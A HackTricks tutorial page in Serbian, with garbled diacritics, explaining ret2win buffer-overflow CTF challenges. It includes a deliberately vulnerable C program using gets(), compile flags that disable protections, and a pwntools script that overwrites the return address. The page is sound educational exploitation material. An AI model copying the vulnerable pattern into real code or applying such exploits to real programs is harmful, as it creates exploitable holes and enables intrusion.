# Ret2win

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

**Ret2win** izazovi su popularna kategorija u takmi캜enjima **Capture The Flag (CTF)**, posebno u zadacima koji uklju캜uju **binarno iskori코캖avanje**. Cilj je iskoristiti ranjivost u datom binarnom fajlu kako bi se izvr코ila odre캠ena, neizazvana funkcija unutar binarnog fajla, 캜esto nazvana ne코to poput `win`, `ret2win`, itd. Ova funkcija, kada se izvr코i, obi캜no ispisuje zastavu ili poruku o uspehu. Izazov obi캜no uklju캜uje prepisivanje **adrese povratka** na steku kako bi se preusmerio tok izvr코avanja ka 쬰ljenoj funkciji. Evo detaljnijeg obja코njenja sa primerima:

### Primer u programskom jeziku C

Razmotrimo jednostavan C program sa ranjivo코캖u i funkcijom `win` koju nameravamo da pozovemo:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Da biste kompajlirali ovaj program bez za코tite steka i sa **ASLR** onemogu캖enim, mo쬰te koristiti slede캖u komandu:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: Kompajliraj program kao 32-bitni binarni fajl (ovo je opcionalno ali 캜esto se koristi u CTF izazovima).
* `-fno-stack-protector`: Onemogu캖i za코titu od preplavljivanja steka.
* `-z execstack`: Dozvoli izvr코avanje koda na steku.
* `-no-pie`: Onemogu캖i izvr코avanje nezavisno od pozicije kako bi se osiguralo da se adresa funkcije `win` ne promeni.
* `-o vulnerable`: Nazovi izlazni fajl `vulnerable`.

### Python Eksploatacija kori코캖enjem Pwntools

Za eksploataciju, koristi캖emo **pwntools**, mo캖an CTF okvir za pisanje eksploata. Skripta za eksploataciju 캖e kreirati payload kako bi preplavila bafer i prepisala povratnu adresu sa adresom funkcije `win`.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Da biste prona코li adresu funkcije `win`, mo쬰te koristiti **gdb**, **objdump**, ili bilo koji drugi alat koji vam omogu캖ava da pregledate binarne datoteke. Na primer, sa `objdump`, mo쬰te koristiti:
```sh
objdump -d vulnerable | grep win
```
Ova komanda 캖e vam prikazati sklop `win` funkcije, uklju캜uju캖i njenu po캜etnu adresu.

Python skripta 코alje pa쬷jivo oblikovanu poruku koja, kada je obra캠ena od strane `vulnerable_function`, preplavljuje bafer i prepisuje adresu povratka na steku adresom `win`. Kada se `vulnerable_function` vrati, umesto vra캖anja na `main` ili izlaska, prelazi na `win`, i poruka se ispisuje.

## Za코tite

* **ASLR** treba biti onemogu캖en da bi adresa bila pouzdana tokom izvr코avanja ili adresa na kojoj 캖e funkcija biti sme코tena ne캖e uvek biti ista i treba캖e vam neko curenje informacija da biste saznali gde je sme코tena win funkcija.
* **Stack Canaries** tako캠e treba da budu onemogu캖eni ili kompromitovana povratna adresa EIP nikada ne캖e biti ispratena.

## Ostali primeri i Reference

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32-bitni, bez ASLR-a
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* 64 bita sa ASLR-om, sa curenjem bin adrese
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64 bita, bez ASLR-a
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32 bita, bez ASLR-a, dvostruko mali prelaz, prvo preplavljuje stek i pove캖ava veli캜inu drugog prelaza
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 bita, relro, bez canary-a, nx, bez pie-a, formatiranje stringa za prepisivanje adrese `fflush` sa win funkcijom (ret2win)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html)
* 32 bita, nx, ni코ta drugo, delimi캜no prepisivanje EIP-a (1 bajt) da bi se pozvala win funkcija
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html)
* 32 bita, nx, ni코ta drugo, delimi캜no prepisivanje EIP-a (1 bajt) da bi se pozvala win funkcija
* [https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html](https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html)
* Program samo validira poslednji bajt broja kako bi proverio veli캜inu unosa, stoga je mogu캖e dodati bilo koju veli캜inu sve dok je poslednji bajt unutar dozvoljenog opsega. Zatim, unos stvara preplavljivanje bafera iskori코캖eno sa ret2win.
